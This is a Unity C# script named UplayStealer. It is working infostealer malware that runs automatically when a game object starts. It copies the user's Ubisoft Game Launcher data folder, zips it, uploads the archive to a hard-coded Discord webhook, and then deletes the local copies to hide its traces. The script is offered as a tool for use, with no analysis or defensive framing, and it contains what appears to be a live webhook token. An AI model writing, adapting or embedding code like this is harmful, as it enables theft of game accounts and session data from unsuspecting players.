using System;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;
using UnityEngine;

public class UplayStealer : MonoBehaviour
{
    private string tempPath = Path.GetTempPath(); // Temporary path to store files
    private string discordWebhookUrl = "https://discord.com/api/webhooks/1303804400514633838/nqNZTP-WeqPTMTniA6ImACpIB0_2LUfDUtHzObaJ-toaGv2kN4qI8timwImRGWJZW7fA"; // Your Discord webhook URL

    private void Start()
    {
        StealUplay();
    }

    private async void StealUplay()
    {
        string uplayPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Ubisoft Game Launcher");
        string saveToPath = Path.Combine(tempPath, "Games", "Uplay");

        try
        {
            // Step 1: Check if Uplay directory exists
            if (Directory.Exists(uplayPath))
            {
                // Step 2: Create directory to save copied files
                Directory.CreateDirectory(saveToPath);

                // Step 3: Copy files
                CopyFiles(uplayPath, saveToPath);

                // Step 4: Compress the copied files into a ZIP
                string zipFilePath = Path.Combine(tempPath, "UplayFiles.zip");
                ZipFile.CreateFromDirectory(saveToPath, zipFilePath);

                // Step 5: Send the ZIP file to Discord
                await SendFileToDiscord(zipFilePath);

                // Step 6: Clean up
                File.Delete(zipFilePath);
                Directory.Delete(saveToPath, true);
            }
            else
            {
                Debug.LogWarning("Uplay directory does not exist.");
            }
        }
        catch (Exception ex)
        {
            Debug.LogError($"Error in StealUplay: {ex.Message}");
        }
    }

    private void CopyFiles(string sourceDir, string destDir)
    {
        // Copy files from sourceDir to destDir
        foreach (string file in Directory.GetFiles(sourceDir, "*.*", SearchOption.AllDirectories))
        {
            string destFile = Path.Combine(destDir, Path.GetFileName(file));
            File.Copy(file, destFile, true);
        }
    }

    private async Task SendFileToDiscord(string filePath)
    {
        using (var client = new HttpClient())
        {
            // Create a MultipartFormDataContent to hold the file content
            using (var content = new MultipartFormDataContent())
            {
                // Read the file into a FileStream
                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    content.Add(new StreamContent(fileStream), "file", Path.GetFileName(filePath));

                    // Send POST request to Discord webhook
                    var response = await client.PostAsync(discordWebhookUrl, content);
                    response.EnsureSuccessStatusCode(); // Throw if not a success code

                    Debug.Log("File sent successfully to Discord.");
                }
            }
        }
    }
}
